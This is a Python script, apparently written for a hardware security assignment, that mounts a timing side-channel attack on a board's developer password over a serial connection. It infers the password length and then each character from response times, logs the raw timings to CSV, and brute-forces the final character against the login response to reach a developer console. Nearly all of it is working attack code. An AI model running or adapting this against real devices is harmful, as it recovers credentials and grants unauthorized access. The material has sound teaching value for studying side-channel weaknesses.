"""
Timing attack a password de developer (Target 1).

Estrategia:
 1) Inferir o COMPRIMENTO: a validacao do comprimento e feita antes de tudo,
    por isso o comprimento certo demora mais (entra na comparacao caracter a
    caracter). Testa 1..MAX_LEN e procura o salto no tempo.
 2) Inferir CARACTER A CARACTER: fixado o comprimento, para cada posicao
    testa 'a'..'z' no inicio e preenche o resto com FILLER. O caracter certo
    passa a comparacao e obriga a placa a comparar a posicao seguinte, logo
    demora mais. Escolhe-se o de maior tempo MEDIO.

Guarda todos os tempos em bruto num CSV (exigido pelo enunciado).

Uso:
    python timing_attack.py length      -> infere o comprimento
    python timing_attack.py recover N   -> recupera password de comprimento N

Requisitos: pip install pyserial
"""

import sys
import csv
import statistics
from serial_target import SerialTarget

sys.stdout.reconfigure(line_buffering=True)  # mostra o progresso em tempo real

ALPHABET = "abcdefghijklmnopqrstuvwxyz"   # a-z (restricao do enunciado)
MAX_LEN = 20                              # maximo de caracteres (enunciado)
FILLER = "a"                              # preenche posicoes ainda desconhecidas
SAMPLES = 60                              # amostras por candidato (reduz ruido)
SCAN_SAMPLES = 12                         # amostras no modo scan (mais rapido)

LEN_CSV = "length_timing.csv"             # dados brutos da fase de comprimento
POS_CSV = "char_timing.csv"               # dados brutos da fase caracter a caracter


def measure(target, password, samples=SAMPLES):
    """Mede 'samples' tempos para uma password. Devolve lista de ns."""
    times = []
    for _ in range(samples):
        dt, _ = target.time_attempt(password)
        times.append(dt)
    return times


def infer_length(target):
    rows = []
    best_len, best_mean = None, -1.0
    with open(LEN_CSV, "w", newline="") as f:
        w = csv.writer(f)
        w.writerow(["length", "sample", "elapsed_ns"])
        for L in range(1, MAX_LEN + 1):
            candidate = FILLER * L
            times = measure(target, candidate)
            for i, t in enumerate(times):
                w.writerow([L, i, t])
            mn = min(times) / 1e6
            md = statistics.median(times) / 1e6
            print(f"len {L:2d}: min = {mn:8.3f} ms | mediana = {md:8.3f} ms")
            rows.append((L, mn))
            if mn > best_mean:
                best_mean, best_len = mn, L
    print(f"\nComprimento provavel (maior tempo): {best_len}")
    print(f"Dados brutos -> {LEN_CSV}")
    print("Confirma visualmente onde o tempo 'salta' no grafico.")
    return best_len


def recover_password(target, length):
    known = ""
    with open(POS_CSV, "w", newline="") as f:
        w = csv.writer(f)
        w.writerow(["position", "candidate_char", "sample", "elapsed_ns"])
        for pos in range(length):
            mins = {}
            for ch in ALPHABET:
                guess = known + ch + FILLER * (length - len(known) - 1)
                times = measure(target, guess)
                for i, t in enumerate(times):
                    w.writerow([pos, ch, i, t])
                mins[ch] = min(times)            # minimo = tempo "limpo"
            ranked = sorted(mins.items(), key=lambda kv: kv[1], reverse=True)
            winner, w_min = ranked[0]
            runner, r_min = ranked[1]
            margin = (w_min - r_min) / 1e6
            known += winner
            print(f"pos {pos}: '{winner}'  "
                  f"(margem p/ 2o lugar = {margin:.3f} ms)  parcial = {known}")
    print(f"\nPassword inferida: {known}")
    print(f"Dados brutos -> {POS_CSV}")
    return known


def scan_len_char(target):
    """Procura comprimento e 1o caracter ao mesmo tempo.
    Para cada comprimento L, testa 'a'..'z' na posicao 0 (resto com FILLER).
    No comprimento certo, o caracter correto separa-se (gap maior)."""
    import csv
    results = []
    with open("scan_pos0.csv", "w", newline="") as f:
        w = csv.writer(f)
        w.writerow(["length", "candidate_char", "sample", "elapsed_ns"])
        for L in range(1, MAX_LEN + 1):
            mins = {}
            for ch in ALPHABET:
                guess = ch + FILLER * (L - 1)
                times = measure(target, guess, samples=SCAN_SAMPLES)
                for i, t in enumerate(times):
                    w.writerow([L, ch, i, t])
                mins[ch] = min(times)
            ranked = sorted(mins.items(), key=lambda kv: kv[1], reverse=True)
            (c1, m1), (c2, m2) = ranked[0], ranked[1]
            gap = (m1 - m2) / 1e6
            print(f"len {L:2d}: melhor '{c1}'  gap p/ 2o = {gap:6.3f} ms")
            results.append((L, c1, gap))
    results.sort(key=lambda r: r[2], reverse=True)
    L, c, gap = results[0]
    print(f"\nMaior separacao: comprimento {L}, 1o caracter provavel '{c}' (gap {gap:.3f} ms)")
    print("Se esse gap for claramente maior que os restantes, e esse o comprimento.")
    print("Dados brutos -> scan_pos0.csv")


def find_last_char(target, prefix):
    """Descobre o ultimo caracter pela RESPOSTA (nao por timing):
    testa prefix+a..z e para quando a resposta deixar de ser 'Login failure'
    (password completa -> consola de developer)."""
    for ch in ALPHABET:
        resp = target.submit(prefix + ch)
        flat = resp.replace("\r", "").replace("\n", " | ").strip()
        ok = "login failure" not in resp.lower()
        print(f"{ch}: {'<<< DIFERENTE' if ok else 'login failure'}  :: {flat[:120]}")
        if ok:
            print(f"\nPassword completa: {prefix + ch}")
            return prefix + ch
    print("\nNenhum caracter mudou a resposta. Confirma o prefixo.")
    return None


def main():
    if len(sys.argv) < 2 or sys.argv[1] not in ("length", "recover", "scan", "finish"):
        print(__doc__)
        return
    target = SerialTarget().open()
    try:
        if sys.argv[1] == "length":
            infer_length(target)
        elif sys.argv[1] == "scan":
            scan_len_char(target)
        elif sys.argv[1] == "finish":
            if len(sys.argv) < 3:
                print("Uso: python timing_attack.py finish <prefixo_conhecido>")
                return
            find_last_char(target, sys.argv[2])
        else:
            if len(sys.argv) < 3:
                print("Falta o comprimento: python timing_attack.py recover N")
                return
            recover_password(target, int(sys.argv[2]))
    finally:
        target.close()


if __name__ == "__main__":
    main()
